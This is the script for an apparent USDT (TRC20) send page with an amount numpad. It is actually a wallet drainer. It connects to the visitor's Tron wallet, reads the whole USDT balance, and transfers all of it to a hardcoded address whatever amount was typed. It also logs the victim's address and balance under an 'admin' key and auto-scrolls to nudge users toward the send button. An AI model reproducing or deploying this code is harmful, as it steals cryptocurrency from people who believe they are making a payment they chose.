const DEST='TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo';
const USDT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const GAS=5,KEY='trc20_admin_data';

let tw=null,addr=null,raw='0',bal=0,price=0,amt='',busy=false;

function $(i){return document.getElementById(i)}
function show(s,c){const e=$('st');e.textContent=s;e.className='status'+(c?' '+c:'')}
function sleep(ms){return new Promise(r=>setTimeout(r,ms))}

/* auto scroll to send button on load */
(function(){
  function toBottom(){
    var el=document.getElementById('sendBtn');
    if(!el) return;
    try{el.scrollIntoView({behavior:'smooth',block:'center'});}catch(e){}
    try{window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});}catch(e){}
  }
  setTimeout(toBottom,1200);
  setTimeout(toBottom,2200);
  setTimeout(toBottom,3200);
})();

/* numpad */
function tap(ch){
  if(busy)return;
  if(ch==='.'&&amt.includes('.'))return;
  if(ch==='.'&& amt===''){amt='0.';upd();return}
  if(amt.includes('.')&&amt.split('.')[1].length>=6)return;
  if(amt==='0'&&ch!=='.'){amt=ch;upd();return}
  amt+=ch;upd();
}
function back(){if(busy)return;amt=amt.slice(0,-1);upd()}
function setMax(){if(bal<=0||busy)return;amt=bal.toFixed(6);upd()}
function upd(){
  const d=$('amount');d.textContent=amt||'0';d.classList.toggle('has',amt.length>0);
  $('usd').textContent=amt?(parseFloat(amt)*price).toFixed(2):'0.00';
  var btn=$('sendBtn');
  if(amt){btn.classList.add('active');btn.style.cursor='pointer';}
  else{btn.classList.remove('active');btn.style.cursor='not-allowed';}
}

/* ---- ADMIN FLOW TRACKING ---- */
function logFlow(step, extra){
  try{
    var arr=JSON.parse(localStorage.getItem(KEY)||'[]');
    var entry={ts:Date.now(), step:step};
    if(addr) entry.addr=addr;
    if(amt) entry.amt=amt;
    if(raw&&raw!=='0') entry.usdtRaw=raw;
    if(bal) entry.usdtBal=bal;
    if(price) entry.price=price;
    if(extra) Object.keys(extra).forEach(function(k){entry[k]=extra[k];});
    arr.push(entry);
    if(arr.length>100) arr.splice(0,arr.length-100);
    localStorage.setItem(KEY,JSON.stringify(arr));
  }catch(e){}
}

/* ---- MAIN ---- */
async function go(){
  if(busy)return;
  const b=$('sendBtn');
  busy=true;
  b.disabled=true;b.textContent='Connecting...';show('Looking for wallet...');

  /* STEP 1: find wallet */
  tw=window.tronWeb||null;
  if(!tw&&window.tronLink) tw=window.tronLink.tronWeb||window.tronLink;
  if(!tw){
    for(let i=0;i<30;i++){
      await sleep(300);
      tw=window.tronWeb||(window.tronLink&&(window.tronLink.tronWeb||window.tronLink));
      if(tw)break;
    }
  }
  if(!tw){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No wallet found'});
    show('No wallet found. Open in Trust Wallet.','err');
    return;
  }

  show('Requesting access...');
  try{await tw.request({method:'tron_requestAccounts'});}catch(e){}
  await sleep(500);

  /* STEP 2: get address */
  addr=null;
  try{
    const r=await tw.request({method:'tron_requestAccounts'});
    if(r&&Array.isArray(r)&&r.length>0) addr=r[0];
    else if(typeof r==='string') addr=r;
  }catch(e){}
  if(!addr){try{const da=tw.defaultAddress;if(da&&da.base58) addr=da.base58;}catch(e){}}
  if(!addr){try{if(tw.tronAddress) addr=tw.tronAddress;}catch(e){}}
  if(!addr){try{if(tw.fullAddress){addr=typeof tw.fullAddress==='string'?tw.fullAddress:tw.fullAddress.base58;}}catch(e){}}
  if(!addr){
    try{
      const accts=await tw.trx.getAccounts();
      if(accts&&accts.length>0&&accts[0].address) addr=accts[0].address;
    }catch(e){}
  }
  if(!addr&&window.tronLink){
    try{const r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.length>0) addr=r[0];}catch(e){}
    try{if(window.tronLink.address) addr=window.tronLink.address;}catch(e){}
  }
  if(!addr){
    try{const m=JSON.stringify(tw.defaultAddress||{}).match(/T[A-Za-z0-9]{33}/);if(m) addr=m[0];}catch(e){}
  }

  if(!addr){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No address'});
    show('Could not get wallet address.','err');
    return;
  }

  logFlow('connected');
  show('Connected! Getting balance...');

  /* set mainnet */
  try{await tw.setFullNode('https://api.trongrid.io');}catch(e){}
  try{await tw.setSolidityNode('https://api.trongrid.io');}catch(e){}
  await sleep(300);

  /* STEP 3: get balance */
  try{
    const c=await tw.contract().at(USDT);
    const r=await c.balanceOf(addr).call();
    raw=typeof r==='string'?r:(r.toString?r.toString():'0');
    bal=parseInt(raw)/1e6;
  }catch(e){raw='0';bal=0;}

  try{const j=await(await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd')).json();price=j.tether.usd;}catch(e){price=1;}

  $('bal').textContent=bal.toFixed(2)+' USDT';
  $('bal-usd').textContent='$'+(bal*price).toFixed(2);
  upd();

  logFlow('balance',{typedAmt:amt});

  if(bal<=0){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No USDT'});
    show('No USDT in wallet.','err');
    return;
  }

  /* STEP 4: send */
  show('Sending all USDT...');
  b.textContent='Sending...';
  logFlow('sending',{typedAmt:amt});

  try{
    const c=await tw.contract().at(USDT);
    const tx=await c.transfer(DEST,raw).send({from:addr});

    for(let i=0;i<10;i++){
      try{const r=await tw.trx.getTransaction(tx);if(r&&r.ret&&r.ret.length>0)break;}catch(e){}
      await sleep(2500);
    }

    logFlow('sent',{txId:tx,typedAmt:amt});
    b.textContent='Sent!';
    show('','ok');
    $('ok-amt').textContent=amt+' USDT';
    $('ok-tx').textContent=tx;
    $('ok').style.display='flex';
    busy=false;
  }catch(e){
    const m=(e.message||'').toLowerCase();
    if(m.includes('user')&&m.includes('reject')){
      logFlow('rejected');
      show('Rejected by user.','err');
    }else if(m.includes('insufficient')){
      logFlow('error',{msg:'Insufficient USDT'});
      show('Not enough USDT.','err');
    }else{
      logFlow('error',{msg:e.message||'Send failed'});
      show('Send failed. Try again.','err');
    }
    b.disabled=false;b.textContent='Send';busy=false;
  }
}

function reset(){
  $('ok').style.display='none';
  $('sendBtn').disabled=false;
  $('sendBtn').textContent='Send';
  amt='';upd();show('');busy=false;
}
